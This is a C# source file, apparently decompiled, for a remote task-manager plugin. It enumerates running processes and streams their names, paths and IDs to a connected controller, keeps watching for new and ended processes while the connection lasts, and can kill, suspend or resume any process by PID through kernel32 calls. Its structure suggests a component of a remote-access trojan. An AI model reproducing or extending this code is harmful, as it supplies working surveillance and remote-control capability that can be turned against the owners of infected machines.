using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal static class TaskManager
{
	private static List<Process> processes = new List<Process>();

	private const int PROCESS_TERMINATE = 1;

	private const int PROCESS_SUSPEND_RESUME = 2048;

	private static void Kill(Process proc)
	{
		Client.Send(LEB128.Write(new object[3] { "Process", "DeadProcess", proc.Id }));
	}

	private static void Add(Process proc)
	{
		Client.Send(LEB128.Write(new object[5]
		{
			"Process",
			"NewProcess",
			proc.ProcessName,
			TryPath(proc),
			proc.Id
		}));
	}

	public static void Start()
	{
		processes = Process.GetProcesses().ToList();
		List<Task> list = new List<Task>();
		foreach (Process item in processes)
		{
			list.Add(Task.Factory.StartNew(delegate
			{
				Add(item);
			}));
		}
		Task.WaitAll(list.ToArray());
		while (Client.itsConnect)
		{
			Thread.Sleep(100);
			try
			{
				List<Process> processesNew = Process.GetProcesses().ToList();
				KillingProcess(processes, processesNew);
				NewProcess(processes, processesNew);
				processes = processesNew;
			}
			catch (Exception ex)
			{
				Client.Send(LEB128.Write(new object[3] { "Process", "Error", ex.Message }));
			}
		}
	}

	private static bool ContainsProcess(List<Process> processes, Process process)
	{
		foreach (Process process2 in processes)
		{
			if (process2.ProcessName == process.ProcessName && process2.Id == process.Id)
			{
				return true;
			}
		}
		return false;
	}

	private static void KillingProcess(List<Process> processesOld, List<Process> processesNew)
	{
		List<Task> list = new List<Task>();
		foreach (Process process in processesOld)
		{
			if (!ContainsProcess(processesNew, process))
			{
				list.Add(Task.Factory.StartNew(delegate
				{
					Kill(process);
				}));
			}
		}
		Task.WaitAll(list.ToArray());
	}

	private static string TryPath(Process process)
	{
		try
		{
			return process.MainModule.FileName;
		}
		catch
		{
		}
		return "";
	}

	private static void NewProcess(List<Process> processesOld, List<Process> processesNew)
	{
		List<Task> list = new List<Task>();
		foreach (Process process in processesNew)
		{
			if (!ContainsProcess(processesOld, process))
			{
				list.Add(Task.Factory.StartNew(delegate
				{
					Add(process);
				}));
			}
		}
		Task.WaitAll(list.ToArray());
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

	[DllImport("kernel32.dll")]
	private static extern int SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr hThread);

	public static bool KillProcess(int processId)
	{
		IntPtr intPtr = OpenProcess(1, bInheritHandle: false, processId);
		if (intPtr == IntPtr.Zero)
		{
			return false;
		}
		bool result = TerminateProcess(intPtr, 0u);
		CloseHandle(intPtr);
		return result;
	}

	public static bool SuspendProcess(int processId)
	{
		IntPtr intPtr = OpenProcess(2048, bInheritHandle: false, processId);
		if (intPtr == IntPtr.Zero)
		{
			return false;
		}
		foreach (ProcessThread thread in Process.GetProcessById(processId).Threads)
		{
			IntPtr intPtr2 = OpenThread(2048, bInheritHandle: false, (uint)thread.Id);
			SuspendThread(intPtr2);
			CloseHandle(intPtr2);
		}
		CloseHandle(intPtr);
		return true;
	}

	public static bool ResumeProcess(int processId)
	{
		IntPtr intPtr = OpenProcess(2048, bInheritHandle: false, processId);
		if (intPtr == IntPtr.Zero)
		{
			return false;
		}
		foreach (ProcessThread thread in Process.GetProcessById(processId).Threads)
		{
			IntPtr intPtr2 = OpenThread(2048, bInheritHandle: false, (uint)thread.Id);
			ResumeThread(intPtr2);
			CloseHandle(intPtr2);
		}
		CloseHandle(intPtr);
		return true;
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
}
